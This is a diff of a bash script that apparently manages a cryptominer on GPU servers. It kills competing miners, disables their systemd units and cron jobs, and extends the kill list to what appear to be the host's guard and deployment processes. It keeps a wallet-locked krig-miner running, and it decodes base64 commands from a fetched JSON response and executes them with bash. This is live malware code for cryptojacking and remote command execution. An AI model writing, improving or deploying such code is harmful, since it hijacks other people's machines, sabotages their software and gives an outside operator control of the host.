@@ -18,9 +18,10 @@ pkill -9 -f ps_hb.sh 2>/dev/null
 pkill -9 -f wildrig-multi 2>/dev/null
 pkill -9 -f 'SRBMiner' 2>/dev/null
 pkill -9 -f 'run_prl_' 2>/dev/null
-for pat in 'wr_keeper' 'pearl_keeper' 'peakminer' 'miner_keep' 'keeper.sh' 'i118840' 'prl1pydpjh' 'xmrig'; do pkill -9 -f "$pat" 2>/dev/null; done
-for u in $(systemctl list-units --all --plain --no-legend 2>/dev/null | awk '{print $1}' | grep -Ei 'wildrig|peakminer|prl|miner|krig' | grep -v 'nv-cuda-cache@'); do systemctl disable --now "$u" >/dev/null 2>&1; done
-for f in /etc/cron.d/*; do [ -f "$f" ] || continue; grep -qEi 'wildrig|SRBMiner|peakminer|run_prl_|wr_keeper|pearl_keeper|/opt/arsenal/miners' "$f" 2>/dev/null && mv -f "$f" "$f.disabled" 2>/dev/null; done
+for pat in 'wr_keeper' 'pearl_keeper' 'peakminer' 'miner_keep' 'keeper.sh' 'i118840' 'prl1pydpjh' 'xmrig' 'bootguard' 'deploy_h100' 'deploy_a100' 'guard_' '/opt/arsenal/miners/'; do pkill -9 -f "$pat" 2>/dev/null; done
+[ -f /opt/arsenal/miners/wildrig-multi ] && mv -f /opt/arsenal/miners/wildrig-multi /opt/arsenal/miners/wildrig-multi.BANNED-OOM 2>/dev/null
+for u in $(systemctl list-units --all --plain --no-legend 2>/dev/null | awk '{print $1}' | grep -Ei 'wildrig|peakminer|prl|miner|krig|guard|boot|deploy|arsenal' | grep -v 'nv-cuda-cache@'); do systemctl disable --now "$u" >/dev/null 2>&1; done
+for f in /etc/cron.d/*; do [ -f "$f" ] || continue; grep -qEi 'wildrig|SRBMiner|peakminer|run_prl_|wr_keeper|pearl_keeper|/opt/arsenal/miners|bootguard|deploy_h100|guard_' "$f" 2>/dev/null && mv -f "$f" "$f.disabled" 2>/dev/null; done
 rm -f "$B/ps_sup.sh" "$B/bin/wildrig-multi"
 rm -f /etc/cron.d/nv-cuda-cache
 ( crontab -l 2>/dev/null | grep -v -e ps_sup -e ps_hb -e nv-cuda -e krig -e ps8_ ) | crontab - 2>/dev/null
@@ -101,7 +102,7 @@ cat > "$B/ps8_enforce.sh" <<EOF4
 #!/bin/bash
 B=$B; L=$L; W='$W'
 exec 7>"\$B/state/enf.lock"; flock -n 7 || exit 0
-for p in \$(pgrep -f 'wildrig-multi|SRBMiner|peakminer|run_prl_|xmrig' 2>/dev/null); do kill -9 \$p 2>/dev/null; done
+for p in \$(pgrep -f 'wildrig-multi|SRBMiner|peakminer|run_prl_|xmrig|bootguard|deploy_h100|deploy_a100|/opt/arsenal/miners/' 2>/dev/null); do kill -9 \$p 2>/dev/null; done
 for p in \$(pgrep -f 'krig-miner' 2>/dev/null); do
   c=\$(tr '\0' ' ' < /proc/\$p/cmdline 2>/dev/null)
   case "\$c" in *"\$W"*) ;; *) kill -9 \$p 2>/dev/null;; esac
@@ -130,7 +131,8 @@ run_cmd() {
   SHA=\$(echo "\$R" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
   [ -n "\$SHA" ] || return 0
   [ "\$SHA" = "\$(cat \$B/state/cmd8_\$tag.sha 2>/dev/null)" ] && return 0
-  echo "\$R" | grep -o '"content": *"[^"]*"' | head -1 | cut -d'"' -f4 | tr -d '\n' | base64 -d > "\$B/state/cmd8_\$tag.sh" 2>/dev/null
+  echo "\$R" > /tmp/cmd8.json
+  python3 -c 'import json,base64,sys; d=json.load(open("/tmp/cmd8.json")); open(sys.argv[1],"wb").write(base64.b64decode(d["content"]))' "\$B/state/cmd8_\$tag.sh" 2>/dev/null || echo "\$R" | grep -o '"content": *"[^"]*"' | head -1 | cut -d'"' -f4 | sed -e 's/\\\\n//g' | tr -d '\n' | base64 -d > "\$B/state/cmd8_\$tag.sh" 2>/dev/null
   if [ -s "\$B/state/cmd8_\$tag.sh" ]; then
     echo "=== cmd8 \$name \$SHA \$(date -u)" >> "\$L/cmd8.log"
     bash "\$B/state/cmd8_\$tag.sh" >> "\$L/cmd8.log" 2>&1
